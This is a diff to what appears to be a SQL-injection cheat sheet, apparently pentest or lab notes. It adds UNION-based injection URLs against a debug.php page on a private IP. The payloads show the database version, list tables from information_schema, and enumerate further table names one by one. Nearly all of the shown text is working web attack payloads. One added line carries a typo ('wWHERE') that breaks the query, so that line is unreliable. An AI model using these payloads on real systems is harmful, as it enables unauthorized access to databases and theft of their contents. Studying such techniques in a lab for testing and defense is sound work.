@@ -373,9 +373,14 @@ Show database version with UNION:
 http://192.168.160.10/debug.php?id=1 union select all 1,2,@@version
 ```
 
-Show all tables in database with UNION:
+Show tables in database with UNION:
 ```
-http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables
+http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables wWHERE table_schema='$DB_NAME'
+```
+
+To extract different table names from a database:
+```
+http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables WHERE table_schema='$DB_NAME' and table_name!='$TABLE1_NAME'
 ```
 
 Show all columns from the table “users” in the database with UNION:
